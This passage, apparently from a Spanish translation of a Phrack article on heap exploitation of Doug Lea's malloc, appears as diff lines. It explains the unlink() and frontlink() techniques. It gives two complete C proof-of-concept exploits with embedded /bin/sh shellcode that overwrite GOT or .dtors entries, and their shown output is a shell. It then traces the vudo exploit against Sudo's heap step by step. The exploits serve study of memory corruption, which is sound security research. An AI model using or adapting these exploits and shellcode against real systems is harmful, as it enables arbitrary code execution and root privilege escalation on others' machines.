+menos 12 bytes como es explicado a continuacion, en el puntero forward FD
+del trozo falso (lee en line[2]), y la direccion de un shellcode en el
+puntero de regreso BK del trozo falso (lee en line[1]). La macro unlink()
+puede por lo tanto, cuando se esta tratando de tomar este trozo falso de
+su lista doblemente linkeada imaginaria, sobreescribir (en line[3]) el
+puntero de funcion ubicado en FD mas 12 bytes (12 es el offset del campo bk
+con un tag limite) con BK (la direccion del shellcode).
+
+Si el programa vulnerable lee el puntero de funcion sobreescrito (una
+entrada del GOT (Global Offset Table) o uno de los pirateadores de
+debuggeo compilados en Malloc de Doug Lea (__malloc_hook, __free_hook, etc)
+por ejemplo) y saltos a la locacion de memoria a la que apunta, y si un
+shellcode valido es guardado alli en ese momento, el shellcode es ejecutado.
+
+Pero ya que unlink() puede tambien sobreescribir (en line[4]) un entero
+ubicado en la mitad del shellcode, en BK mas 8 bytes (8 es el offset del
+campo fd con un tag limite), con FD (un puntero valido pero probablemente
+no sea codigo maquina valido), la primer instruccion del shellcode deberia
+saltar sobre el entero sobreescrito, en un shellcode clasico.
+
+Esta tecnica unlink(), introducida primero por Solar Designer, es ilustrada
+con una prueba de concepto en 3.6.1.2, y fue exitosamente explotada en
+lo salvaje contra ciertas versiones vulnerables de programas como los
+navegadores Netscape, traceroute y slocate (mencionado en 3.1.2.1).
+
+--------[ 3.6.1.2 - Prueba de concepto ]--------------------------------
+
+El programa a continuacion contien un buffer overflow tipico ya que un
+atacante puede sobreescribir (en line[3] los datos guardados
+inmediatamente despues del final del primer buffer si el primer
+argumento que pasaron al programa (argv[1]) es mas largo que 666 bytes:
+
+$ set -o noclobber && cat > vulnerable.c << EOF
+#include <stdlib.h>
+#include <string.h>
+
+int main( int argc, char * argv[] )
+{
+        char * first, * second;
+
+/*[1]*/ first = malloc( 666 );
+/*[2]*/ second = malloc( 12 );
+/*[3]*/ strcpy( first, argv[1] );
+/*[4]*/ free( first );
+/*[5]*/ free( second );
+/*[6]*/ return( 0 );
+}
+EOF
+
+$ make vulnerable
+cc     vulnerable.c   -o vulnerable
+
+$ ./vulnerable `perl -e 'print "B" x 1337'`
+Segmentation fault (core dumped)
+
+Ya que el primer buffer fue asignado en el heap (en line[1], o mas
+precisamente durante el paso[4] del algoritmo malloc(3)) y no en la pila,
+el atacante no puede usar las tecnicas de romper la pila clasicas y
+simplemente sobreescribe un puntero de instruccion guardado o un
+puntero frame guardado para explotar la vulnerabilidad y ejecutar
+codigo arbitrario:
+
+http://www.phrack.org/show.php?p=49&a=14
+http://www.phrack.org/show.php?p=55&a=8
+
+Pero el atacante puede sobreescribir el tag limite asociado con el segundo
+trozo de memoria (asignado en el heap en line[2]), durante el paso[4] del
+algoritmo malloc(3)), ya que este tag limite esta ubicado inmediatamente
+despues del final del primer trozo. El area de memoria reservada para el
+usuario con el primer trozo incluye incluso el campo prev_size de ese
+tag limite (como esta detallado en 3.3.3), y el tama~o de este area es
+igual a 668 bytes (efectivamente, y como fue calculado en 3.3.1, el tama~o
+del area de memoria reservada para el usuario con el primer trozo es
+igual al tama~o efectivo de este trozo, 672 (request2size(666)), menos 4
+bytes).
+
+Entonces si el tama~o del primer argumento pasado al programa vulnerable
+por el atacante es mayor que o igual a 680 (668 + 3*4) bytes, el atacante
+podra sobreescribir el tama~o, los campos fd y bk del tag limite asociado
+con el segundo trozo. Pueden por lo tanto usar la tecnica unlink(), pero
+como puede ser trucada dlmalloc para procesar el segundo trozo corrompido
+con unlink() desde que este trozo es asignado?
+
+Cuando free(3) es llamado en line[4] para liberar el primer trozo,
+el paso[4.2] del algoritmo free(3) es descartado y el segundo trozo es
+procesado por unlink() si esta libre (si el bit PREV_INUSE del siguiente
+trozo contiguo esta limpio). Desafortundamente este bit es configurado
+porque el segundo trozo es asignado, pero el atacante puede trucar
+dlmalloc para leer un bit PREV_INUSE falso ya que controlan el campo de
+tama~o del segundo trozo (usado por dlmalloc para computar la direccion
+del siguiente trozo contiguo).
+
+Por instancia, si el atacante sobreescribe el campo de tama~o del segundo
+trozo con -4 (0xfffffffc), dlmalloc pensara que el principio del siguiente
+trozo contiguo esta en realidad 4 bytes antes del principio del segundo
+trozo, y por lo tanto leera el campo prev_size del segundo trozo en lugar
+del campo de tama~o del siguiente trozo contiguo. Entonces si el atacante
+guarda aun un entero (un entero cuyo bit PREV_INUSE este limpio) en este
+campo prev_size, dlmalloc procesara el segundo trozo corrompido con unlink()
+y el atacante podra aplicar la tecnica descripta en 3.6.1.1.
+
+Efectivamente, el exploit a continuacion sobreescribe el campo fd del
+segundo trozo con un puntero a la entrada del GOT de la funcion free(3)
+(lee en line[5]) despues del ataque unlink()) menos 12 bytes, y
+sobreescribe el campo bk del segundo trozo con la direccion de un shellcode
+especial guardado 8 (2*4) bytes despues del principio del primer buffer
+(los primeros 8 bytes de este buffer corresponden a los campos fd y bk del
+tag limite asociado y son sobreescritos en line[4], por frontlink() durante
+el paso[4.3] del algoritmo free(3).
+
+Ya que este shellcode es ejecutado en el heap, este exploit funcionara
+contra sistemas protegidos con el patch para el kernel de Linux del Openwall
+Project, pero no contra sistemas protegidos con el patch para el kernel
+de Linux del PaX Team:
+
+http://www.openwall.com/linux/
+http://pageexec.virtualave.net/
+
+$ objdump -R vulnerable | grep free
+0804951c R_386_JUMP_SLOT   free
+
+$ ltrace ./vulnerable 2>&1 | grep 666
+malloc(666)                                       = 0x080495e8
+
+$ set -o noclobber && cat > exploit.c << EOF
+#include <string.h>
+#include <unistd.h>
+
+#define FUNCTION_POINTER ( 0x0804951c )
+#define CODE_ADDRESS ( 0x080495e8 + 2*4 )
+
+#define VULNERABLE "./vulnerable"
+#define DUMMY 0xdefaced
+#define PREV_INUSE 0x1
+
+char shellcode[] =
+        /* the jump instruction */
+        "\xeb\x0appssssffff"
+        /* the Aleph One shellcode */
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main( void )
+{
+        char * p;
+        char argv1[ 680 + 1 ];
+        char * argv[] = { VULNERABLE, argv1, NULL };
+
+        p = argv1;
+        /* el campo fd del primer trozo */
+        *( (void **)p ) = (void *)( DUMMY );
+        p += 4;
+        /* el campo bk del primer trozo */
+        *( (void **)p ) = (void *)( DUMMY );
+        p += 4;
+        /* el shellcode especial */
+        memcpy( p, shellcode, strlen(shellcode) );
+        p += strlen( shellcode );
+        /* el relleno */
+        memset( p, 'B', (680 - 4*4) - (2*4 + strlen(shellcode)) );
+        p += ( 680 - 4*4 ) - ( 2*4 + strlen(shellcode) );
+        /* el campo prev_size del segundo trozo */
+        *( (size_t *)p ) = (size_t)( DUMMY & ~PREV_INUSE );
+        p += 4;
+        /* el campo de tama~o del segundo trozo */
+        *( (size_t *)p ) = (size_t)( -4 );
+        p += 4;
+        /* el campo fd del segundo trozo */
+        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );
+        p += 4;
+        /* el campo bk del segundo trozo */
+        *( (void **)p ) = (void *)( CODE_ADDRESS );
+        p += 4;
+        /* el caracter terminado en NUL */
+        *p = '\0';
+
+        /* la ejecucion del programa vulnerable */
+        execve( argv[0], argv, NULL );
+        return( -1 );
+}
+EOF
+
+$ make exploit
+cc     exploit.c   -o exploit
+
+$ ./exploit
+bash$
+
+------[ 3.6.2 - La tecnica frontlink() ]--------------------------------
+
+--------[ 3.6.2.1 - Concepto ]------------------------------------------
+
+Alternativamente un atacante puede explotar la macro frontlink() para
+abusar programas que manejen erroneamente el heap. La tecnica
+frontlink() es menos flexible y mas dificil de implementar que la
+tecnica unlink(), sin embargo puede ser una opcion interesante ya que
+sus precondiciones son diferentes. Aunque no se conoce ningun exploit
+que aplique esta tecnica frontlink() en lo salvaje, una prueba de
+concepto es presentada en 3.6.2.2, y fue una de las tecnicas posibles
+contra la vulnerabilidad Sudo.
+
+#define frontlink( A, P, S, IDX, BK, FD ) {            \
+    if ( S < MAX_SMALLBIN_SIZE ) {                     \
+        IDX = smallbin_index( S );                     \
+        mark_binblock( A, IDX );                       \
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+        FD->bk = BK->fd = P;                           \
+[1] } else {                                           \
+        IDX = bin_index( S );                          \
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        if ( FD == BK ) {                              \
+            mark_binblock(A, IDX);                     \
+        } else {                                       \
+[2]         while ( FD != BK && S < chunksize(FD) ) {  \
+[3]             FD = FD->fd;                           \
+            }                                          \
+[4]         BK = FD->bk;                               \
+        }                                              \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+[5]     FD->bk = BK->fd = P;                           \
+    }                                                  \
+}
+
+Si el trozo P libre procesado por frontlink() no es un trozo peque~o,
+el codigo en line[1] es ejecutado, y la lista doblemente linkeada
+apropiada de trozos libres es atravesada (en line[2]) hasta encontrar
+el lugar en donde P deberia ser insertado. Si el atacante quiere
+sobreescribir el puntero forward de uno de los trozos atravesados (lee
+en line[3]) con la direccion de un trozo falso cuidadosamente dise~ado,
+pueden trucar frontlink() para dejar el loop[2] mientras FD apunta a
+este trozo falso. Luego el puntero de regreso BK de ese trozo falso
+puede ser leido (en line[4]) y el entero ubicado en BK mas 8 bytes
+(8 es el offset del campo fd con un tag limite) puede ser sobreescrito
+con la direccion del trozo P (en line[5]).
+
+El atacante puede guardar la direccion de un puntero de funcion (menos
+8 bytes por supuesto) en el campo bk del trozo falso, y por consiguiente
+trucar frontlink() para sobreescribir (en line[5]) este puntero de funcion
+con la direccion del trozo P (pero desafortunadamente no con la direccion
+de su eleccion). Ademas, el atacante deberia guardar codigo maquina valido
+en esa direccion ya que su proposito final es ejecutar codigo arbitrario
+la siguiente vez que la funcion apunto a para que el entero sobreescrito
+sea llamado.
+
+Pero la direccion del trozo libre P corresponde al principio del tag limite
+asociado, y por lo tanto a la locacion de su campo prev_size. Entonces
+es realmente posible guardar codigo maquina en prev_size?
+
+- Pero si la disposicion del heap no evoluciona, el atacante puede seguir
+guardando codigo maquina en el campo prev_size del trozo P. En efecto,
+este campo prev_size no es usado por dlmalloc y puede por lo tanto contener
+datos de usuario (como se menciono en 3.3.3), ya que el trozo de memoria
+ubicado inmediatamente antes del trozo P es asignado (podria de otro modo
+haber sido consolidado con el trozo libre P antes de la llamada maligna
+frontlink()).
+
+-- Si el contenido y tama~o de este trozo previo son controlados por el
+atacante, pueden tambien controlar el contenido del campo trepador prev_size
+(el campo prev_size del trozo P). En efecto, si el argumento de tama~o
+pasado a malloc(3) o realloc(3) es un multiplo de 8 bytes menos 4 bytes
+(como esta detallado en 3.3.1), el campo prev_size trepador probablemente
+contendra datos de usuario, y el atacante puede por consiguiente guardar
+una instruccion jump alli. Esta instruccion jump puede, una vez ejecutada,
+simplemente ramificarse a un shellcode clasico ubicado justo antes del
+campo prev_size. Esta tecnica es usada en 3.6.2.2.
+
+- Pero aun si el contenido o tama~o del trozo ubicado antes del trozo P
+no es controlado por el atacante, pueden guardar codigo maquina valido
+en el campo prev_size de P. En efecto, si quieren guardar codigo maquina
+en los 4 bytes correspondientes a este campo prev_size antes alrededor de la
+disposicion del heap prev_size fue arreglado (el atacante puede por
+ejemplo asignar un buffer que podria cubrir el futuro campo prev_size
+y guardar codigo maquina alli), y si el contrnido de ese campo prev_size
+no fue destruido (por ejemplo, una llamada a malloc(3) con un argumento
+de tama~o de 16 reserva 20 bytes para el llamador, y los ultimos 4 bytes
+(el campo trepador prev_size) por lo tanto nunca son sobreescritos por
+el llamador) en el momento en el que la funcion apunto a un entero
+sobreescrito durante y cuando el ataque frontlink() es llamado, el codigo
+maquina podria ser ejecutado y podria simplemente ramificar a un shellcode
+clasico.
+
+--------[ 3.6.2.2 - Prueba de concepto ]--------------------------------
+
+El programa a continuacion es vulnerable a un buffer overflow: aunque
+el atacante no puede overflowear (en line[7]) el primer buffer asignado
+dinamicamente en el heap (en line[1]) con el contenido de argv[2] (ya que
+el tama~o de este primer buffer es exactamente el tama~o de argv[2],
+sin embargo pueden overflowear (en line[9]) el cuarto buffer asignado
+dinamicamente en el heap (en line[4] con el contenido de argv[1]. El tama~o
+del area de memoria reservada para el usuario con el cuarto trozo es igual
+a 668 (request2size(666) -4) bytes (como fue calculado en 3.6.1.2), por lo
+que si el tama~o de argv[1] es mayor que o igual a 676 (668 + 2*4) bytes,
+el atacante puede sobreescribir los campos de tama~o y fd del siguiente
+contiguo tag limite.
+
+$ set -o noclobber && cat > vulnerable.c << EOF
+#include <stdlib.h>
+#include <string.h>
+
+int main( int argc, char * argv[] )
+{
+        char * first, * second, * third, * fourth, * fifth, * sixth;
+
+/*[1]*/ first = malloc( strlen(argv[2]) + 1 );
+/*[2]*/ second = malloc( 1500 );
+/*[3]*/ third = malloc( 12 );
+/*[4]*/ fourth = malloc( 666 );
+/*[5]*/ fifth = malloc( 1508 );
+/*[6]*/ sixth = malloc( 12 );
+/*[7]*/ strcpy( first, argv[2] );
+/*[8]*/ free( fifth );
+/*[9]*/ strcpy( fourth, argv[1] );
+/*[0]*/ free( second );
+        return( 0 );
+}
+EOF
+
+$ make vulnerable
+cc     vulnerable.c   -o vulnerable
+
+$ ./vulnerable `perl -e 'print "B" x 1337'` dummy
+Segmentation fault (core dumped)
+
+Los seis buffers usados por este programa estan asignados dinamicamente
+(en line[1], line[2], line[3], line[4], line[5] y line[6] durante el paso[4]
+del algoritmo malloc(3), y el segundo buffer es por consiguiente ubicado
+inmediatamente despues del primero, el tercero despues del segundo, y asi
+sucesivamente. El atacante puede por lo tanto sobreescribir (en line[9])
+el tag limite asociado con el quinto trozo (asignado en line[5] y liberado
+en line[8]) ya que este trozo esta ubicado inmediatamente despues del
+cuarto buffer overfloweado.
+
+Desafortunadamente la unica llamada a una de las rutinas dlmalloc despues
+del overflow en line[9] es la llamada a free(3) en line[0]. Para liberar
+el segundo buffer, el paso[4] del algoritmo free(3) es descartado,
+pero la macro unlink() no es llamada tampoco en el paso[4.1], ni en el
+paso[4.2], ya que los trozos de memoria que bordean el segundo trozo
+(el primer y el tercer trozo) son asignados (y el tag limite corrompido
+del quinto trozo no es aun leido durante el paso[4.1] o el paso[4.2] del
+algoritmo free(3)). Por lo tanto el atacante no puede explotar la tecnica
+unlink() durante la llamada free(3) en line[0], pero deberia explotar
+la tecnica frontlink() (llamado en el paso[4.3] del algoritmo free(3))
+en su lugar.
+
+Efectivamente, el campo fd del tag limite corrompido asociado con el
+quinto trozo es leido (en line[3] en la macro frontlink()) durante esta
+llamada a frontlink(), ya que el segundo trozo deberia ser insertado en
+la lista doblemente linkeada del numero bin 79 (como fue detallado en
+3.4.1, porque el tama~o efectivo de este trozo es igual a
+1504 (request2size(1500))), ya que el quinto trozo fue insertado en esta
+misma lista doblemente linkeada en line[8] (como esta detallado en 3.4.1,
+porque el tama~o efectivo de este trozo es igual a 1512 (request2size(1508))),
+y ya que el segundo trozo deberia ser insertado despues del quinto trozo
+en esa lista (1504 es efectivamente menos que 1512, y los trozos en cada
+lista son mantenidos en orden decreciente por tama~o, como esta mencionado
+en 3.4.2).
+
+El exploit a continuacion overflowea el cuarto buffer y sobreescribe el
+campo fd del quinto trozo con la direccion de un trozo falso guardado en
+las variables de entorno pasadas al programa vulnerable. El campo de
+tama~o de este trozo falso es puesto a 0 para trucar a free(3) para dejar
+a loop[2] de la macro frontlink() mientras FD apunta a ese trozo falso,
+y en el campo bk del trozo falso es guardada la direccion (menos 8 bytes)
+del primer emplazamiento del puntero de funcion en la seccion .dtors:
+
+http://www.synnergy.net/downloads/papers/dtors.txt
+
+Este puntero de funcion, sobreescrito por frontlink() con la direccion
+del segundo trozo, es leido y ejecutado al final del programa vulnerable.
+Ya que el atacante puede controlar (via argv[2] el contenido y tama~o
+del trozo ubicado inmediatamente antes del segundo trozo (el primer trozo),
+pueden usar uno de los metodos descriptos en 3.6.2.1 para guardar codigo
+maquina valido en el campo prev_size del segundo trozo.
+
+En el exploit siguiente, el tama~o del segundo argumento pasado al programa
+vulnerable (argv[2] es un multiplo de 8 bytes menos 4 bytes, y es mayor que
+o igual al tama~o del shellcode especial usado por el exploit. Los ultimos
+4 bytes de este shellcode especial (incluyendo el caracter terminado en
+NUL) y por lo tanto guardado en los ultimos 4 bytes del primer buffer
+(el campo prev_size del segundo trozo) y corresponde a una instruccion
+jump que simplemente ejecuta un shellcode clasico guardado justo antes.
+
+Ya que el tama~o de argv[2] deberia ser igual a un multiplo de 8 bytes
+menos 4 bytes, y ya que este tama~o deberia tambien ser mayor que o igual al
+tama~o del shellcode especial, el tama~o de argv[2] es simplemente igual
+a ((((sizeof(shellcode) + 4) + 7) & ~7) - 4), que es equivalente a
+(request2size(sizeof(shellcode)) - 4). El tama~o del shellcode especial
+en el siguiente exploit es igual a 49 bytes, y el tama~o de argv[2] es
+por lo tanto igual a 52 (request2size(49) - 4) bytes.
+
+$ objdump -j .dtors -s vulnerable | grep ffffffff
+ 80495a8 ffffffff 00000000                    ........
+
+$ set -o noclobber && cat > exploit.c << EOF
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define FUNCTION_POINTER ( 0x80495a8 + 4 )
+
+#define VULNERABLE "./vulnerable"
+#define FAKE_CHUNK ( (0xc0000000 - 4) - sizeof(VULNERABLE) - (16 + 1) )
+#define DUMMY 0xeffaced
+
+char shellcode[] =
+        /* el shellcode Aleph One */
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh"
+        /* la instruccion jump */
+        "\xeb\xd1p";
+
+int main( void )
+{
+        char * p;
+        char argv1[ 676 + 1 ];
+        char argv2[ 52 ];
+        char fake_chunk[ 16 + 1 ];
+        size_t size;
+        char ** envp;
+        char * argv[] = { VULNERABLE, argv1, argv2, NULL };
+
+        p = argv1;
+        /* el relleno */
+        memset( p, 'B', 676 - 4 );
+        p += 676 - 4;
+        /* el campo fd del quinto trozo */
+        *( (void **)p ) = (void *)( FAKE_CHUNK );
+        p += 4;
+        /* el caracter terminado en NUL */
+        *p = '\0';
+
+        p = argv2;
+        /* el relleno */
+        memset( p, 'B', 52 - sizeof(shellcode) );
+        p += 52 - sizeof(shellcode);
+        /* el shellcode especial */
+        memcpy( p, shellcode, sizeof(shellcode) );
+
+        p = fake_chunk;
+        /* el campo prev_size del trozo falso */
+        *( (size_t *)p ) = (size_t)( DUMMY );
+        p += 4;
+        /* el campo de tama~o del trozo falso */
+        *( (size_t *)p ) = (size_t)( 0 );
+        p += 4;
+        /* el campo fd del trozo falso */
+        *( (void **)p ) = (void *)( DUMMY );
+        p += 4;
+        /* el campo bk del trozo falso */
+        *( (void **)p ) = (void *)( FUNCTION_POINTER - 8 );
+        p += 4;
+        /* el caracter terminado en NUL */
+        *p = '\0';
+
+        /* el tama~o del array envp */
+        size = 0;
+        for ( p = fake_chunk; p < fake_chunk + (16 + 1); p++ ) {
+                if ( *p == '\0' ) {
+                        size++;
+                }
+        }
+        size++;
+
+        /* la asignacion del array envp */
+        envp = malloc( size * sizeof(char *) );
+
+        /* el contenido del array envp */
+        size = 0;
+        for ( p = fake_chunk; p < fake_chunk + (16+1); p += strlen(p)+1 ) {
+                envp[ size++ ] = p;
+        }
+        envp[ size ] = NULL;
+
+        /* la ejecucion del programa vulnerable */
+        execve( argv[0], argv, envp );
+        return( -1 );
+}
+EOF
+
+$ make exploit
+cc     exploit.c   -o exploit
+
+$ ./exploit
+bash$
+
+--[ 4 - Explotando la vulnerabilidad Sudo ]-----------------------------
+
+----[ 4.1 - La Teoria ]-------------------------------------------------
+
+Para explotar la vulnerabilidad Sudo, y como es mencionado en 2.4, un
+atacante deberia sobreescribir un byte del tag limite ubicado
+inmediatamente despues del final del buffer del msg, y deberia sacar
+ventaja de este byte erroneamente sobreescrito antes de que sea
+restaurado.
+
+Efectivamente, el exploit provisto en 4.2 truca a do_syslog() para
+sobreescribir (en line[5] en do_syslog()) un byte del puntero bk
+asociado con este siguiente contiguo tag limite, truca a malloc(3)
+para seguir (en el paso[3] en malloc(3)) este puntero de regreso
+corrompido a un trozo de memoria falso, y truca a malloc(3) para
+sacar (en el paso[3.2] en malloc(3)) este trozo falso de su
+lista doblemente linkeada imaginaria. El atacante puede por lo tanto
+aplicar la tecnica unlink() en 3.6.1 y eventualmente ejecutar codigo
+arbitrario como root.
+
+Como estos trucos sucesivos son realmente realizados es presentado a
+continuacion via una ejecucion completa, exitosa y comentada del
+exploit Sudo (el dlmalloc llama al traceado siguiente donde fue
+llevado a cabo por Sudo, y fue obtenido via una shared library especial
+en /etc/ld.so.preload):
+
+$ ./vudo 0x002531dc 62595 6866
+malloc( 9 ): 0x0805e480;
+malloc( 7 ): 0x0805e490;
+malloc( 6 ): 0x0805e4a0;
+malloc( 5 ): 0x0805e4b0;
+malloc( 36 ): 0x0805e4c0;
+malloc( 18 ): 0x0805e4e8;
+malloc( 14 ): 0x0805e500;
+malloc( 10 ): 0x0805e518;
+malloc( 5 ): 0x0805e528;
+malloc( 19 ): 0x0805e538;
+malloc( 3 ): 0x0805e550;
+malloc( 62596 ): 0x0805e560;
+
+Este buffer de 62596 bytes fue asignado por la funcion tzset(3)
+(llamada por Sudo al principio de la funcion init_vars()) y es una
+simple copia de la variable de entorno TZ, cuyo tama~o fue provisto
+por el atacante via el segundo argumento pasado al exploit Vudo
+(62596 es efectivamente igual a 62595 mas 1, el tama~o de un
+caracter terminado en NUL).
+
+La utilidad de tal buffer dinamicamente asignado es detallada mas tarde,
+pero probo ser escencial para el exploit Sudo. Por ejemplo, este exploit
+nunca funcionara contra el sistema operativo Debian ya que la funcion
+tzset(3) usada por Debian no lee el valor de la variable de entorno TZ
+cuando un programa SUID o SGID es ejecutado.
+
+malloc( 176 ): 0x0806d9e8;
+free( 0x0806d9e8 );
+malloc( 17 ): 0x0806d9e8;
+malloc( 6 ): 0x0806da00;
+malloc( 4096 ): 0x0806da10;
+malloc( 6 ): 0x0806ea18;
+malloc( 1024 ): 0x0806ea28;
+malloc( 176 ): 0x0806ee30;
+malloc( 8 ): 0x0806eee8;
+malloc( 120 ): 0x0806eef8;
+malloc( 15 ): 0x0806ef78;
+malloc( 38 ): 0x0806ef90;
+malloc( 40 ): 0x0806efc0;
+malloc( 36 ): 0x0806eff0;
+malloc( 15 ): 0x0806f018;
+malloc( 38 ): 0x0806f030;
+malloc( 40 ): 0x0806f060;
+malloc( 36 ): 0x0806f090;
+malloc( 14 ): 0x0806f0b8;
+malloc( 38 ): 0x0806f0d0;
+malloc( 40 ): 0x0806f100;
+malloc( 36 ): 0x0806f130;
+malloc( 14 ): 0x0806f158;
+malloc( 38 ): 0x0806f170;
+malloc( 40 ): 0x0806f1a0;
+malloc( 36 ): 0x0806f1d0;
+malloc( 36 ): 0x0806f1f8;
+malloc( 19 ): 0x0806f220;
+malloc( 40 ): 0x0806f238;
+malloc( 38 ): 0x0806f268;
+malloc( 15 ): 0x0806f298;
+malloc( 38 ): 0x0806f2b0;
+malloc( 17 ): 0x0806f2e0;
+malloc( 38 ): 0x0806f2f8;
+malloc( 17 ): 0x0806f328;
+malloc( 38 ): 0x0806f340;
+malloc( 18 ): 0x0806f370;
+malloc( 38 ): 0x0806f388;
+malloc( 12 ): 0x0806f3b8;
+malloc( 38 ): 0x0806f3c8;
+malloc( 17 ): 0x0806f3f8;
+malloc( 38 ): 0x0806f410;
+malloc( 17 ): 0x0806f440;
+malloc( 40 ): 0x0806f458;
+malloc( 18 ): 0x0806f488;
+malloc( 40 ): 0x0806f4a0;
+malloc( 18 ): 0x0806f4d0;
+malloc( 38 ): 0x0806f4e8;
+malloc( 40 ): 0x0806f518;
+malloc( 16 ): 0x0806f548;
+malloc( 38 ): 0x0806f560;
+malloc( 40 ): 0x0806f590;
+free( 0x0806eef8 );
+free( 0x0806ee30 );
+malloc( 16 ): 0x0806eef8;
+malloc( 8 ): 0x0806ef10;
+malloc( 12 ): 0x0806ef20;
+malloc( 23 ): 0x0806ef30;
+calloc( 556, 1 ): 0x0806f5c0;
+malloc( 26 ): 0x0806ef50;
+malloc( 23 ): 0x0806ee30;
+malloc( 12 ): 0x0806ee50;
+calloc( 7, 16 ): 0x0806ee60;
+malloc( 176 ): 0x0806f7f0;
+free( 0x0806f7f0 );
+malloc( 28 ): 0x0806f7f0;
+malloc( 5 ): 0x0806eed8;
+malloc( 11 ): 0x0806f810;
+malloc( 4095 ): 0x0806f820;
+
+Este buffer de 4095 bytes fue asignado por la funcion sudo_getpwuid(),
+y es una simple copia de la variable de entorno SHELL provista por el
+exploit Sudo. Ya que Sudo fue llamado con la opcion -s (la utilidad
+de esta opcion es detallada subsecuentemente), el tama~o de la variable
+de entorno SHELL (incluyendo el caracter NUL trepador) no puede exceder
+4095 bytes por un chequeo llevado a cabo al principio de la funcion
+find_path() llamada por Sudo.
+
+La variable de entorno SHELL construida por el exploit esta exclusivamente
+compuesta de punteros indicando una sola locacion en la pila, cuya
+direccion no contiene ningun byte NUL (0xbfffff1e en este caso). Las
+razones detras de la eleccion de esta direccion particular son
+expuestas a continuacion.
+
+malloc( 1024 ): 0x08070828;
+malloc( 16 ): 0x08070c30;
+malloc( 8 ): 0x08070c48;
+malloc( 176 ): 0x08070c58;
+free( 0x08070c58 );
+malloc( 35 ): 0x08070c58;
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por la
+funcion load_interfaces(), y es una de las claves para una explotacion
+exitosa de la vulnerabilidad Sudo:
+
+malloc( 8200 ): 0x08070c80;
+malloc( 16 ): 0x08072c90;
+realloc( 0x08072c90, 8 ): 0x08072c90;
+free( 0x08070c80 );
+
+El buffer de 8200 bytes y el de 16 bytes fueron asignados durante el paso[4]
+en malloc(3), y el ultimo (aun una vez reasignado) fue por consiguiente
+guardado inmediatamente despues del formador. Ademas, un agujero fue creado
+en el heap ya que el buffer de 8200 bytes fue liberado durante el paso[4.3]
+del algoritmo free(3).
+
+malloc( 2004 ): 0x08070c80;
+malloc( 176 ): 0x08071458;
+malloc( 4339 ): 0x08071510;
+
+El buffer de 2004 bytes fue asignado por la funcion init_vars() (porque Sudo
+fue llamado con la opcion -s) para contener punteros al comando y
+argumentos a ser ejecutados por Sudo (porvisto por el exploit Vudo).
+Este buffer fue guardado al principio del buffer de 8200 bytes liberado
+previamente, durante el paso[3.1] en malloc(3).
+
+Los buffers de 176 y 4339 bytes fueron asignados durante el paso[2.1]
+en malloc(3), y guardados inmediatamente despues del final del buffer
+de 2004 bytes asignado arriba (el buffer de 4339 bytes fue creado para
+contener el comando y argumentos a ser ejecutados por Sudo (provisto
+por el exploit)).
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por
+la funcion setenv(3) para crear la variable de entorno SUDO_COMMAND:
+
+realloc( 0x00000000, 27468 ): 0x08072ca8;
+malloc( 4352 ): 0x080797f8;
+malloc( 16 ): 0x08072608;
+
+El buffer de 27468 fue asignado por setenv(3) para contener punteros
+a las variables de entorno pasadas a Sudo por el exploit (el numero
+de variables de entorno pasadas a Sudo fue provisto por el atacante
+(el tercer argumento pasado al exploit Vudo)). Debido al tama~o
+considerable de este buffer, fue asignado en el paso[4] en malloc(3),
+despues del final del buffer de 8 bytes ubicado inmediatamente despues
+del remainder del agujero de 8200 bytes.
+
+El buffer de 4352 bytes, la variable de entorno SUDO_COMMAND
+(cuyo tama~o es igual al tama~o del buffer de 4339 bytes previamente
+asignado, mas el tama~o del prefijo SUDO_COMMAND=), fue asignado en el
+paso[4] en malloc(3), y fue por lo tanto guardado inmediatamente despues
+del final del buffer de 27468 bytes asignado arriba.
+
+El buffer de 16 bytes fue asignado en el paso[3.1] en malloc(3), y esta
+por lo tanto ubicado inmediatamente despues del final del buffer de 4339
+bytes, en el remainder del agujero de 8200 bytes).
+
+free( 0x08071510 );
+
+El buffer de 4339 bytes fue liberado, en el paso[4.3] en free(3), y
+por lo tanto creo un agujero en el heap (el buffer asignado guardado
+antes de este agujero es el buffer de 176 bytes cuya direccion es
+0x08071458, el buffer asignado guardado despues de este agujero es el
+buffer de 16 bytes cuya direccion es 0x08072608).
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por la
+funcion setenv(3) para crear la variable de entorno SUDO_USER:
+
+realloc( 0x08072ca8, 27472 ): 0x0807a900;
+malloc( 15 ): 0x08072620;
+malloc( 16 ): 0x08072638;
+
+El buffer de 27468 bytes asignado previamente fue reasignado para espacio
+adicional, pero ya que no puede ser extendido (un trozo libre demasiado
+peque~o fue guardado antes (el remainder del agujero de 8200 bytes) y
+un trozo asignado fue guardado despues (el buffer de 4352 bytes), fue
+liberado en el paso[5.4.2] en realloc(3) (un nuevo agujero fue por lo tanto
+creado en el heap) y otro trozo fue asignado en el paso[5.4] en realloc(3).
+
+El buffer de 15 bytes fue asignado, durante el paso[3.1] en malloc(3),
+despues del final del buffer de 16 bytes asignado arriba (cuya direccion
+es igual a 0x08072608).
+
+Este buffer de 16 bytes fue asignado, durante el paso[2.1] en malloc(3),
+despues del final del buffer de 15 bytes asignado arriba (cuya direccion
+es 0x08072620).
+
+Las siguientes series de llamadas dlmalloc son llevadas a cabo por la
+funcion setenv(3) para crear las variables de entorno SUDO_UID y
+SUDO_GID:
+
+realloc( 0x0807a900, 27476 ): 0x0807a900;
+malloc( 13 ): 0x08072650;
+malloc( 16 ): 0x08072668;
+realloc( 0x0807a900, 27480 ): 0x0807a900;
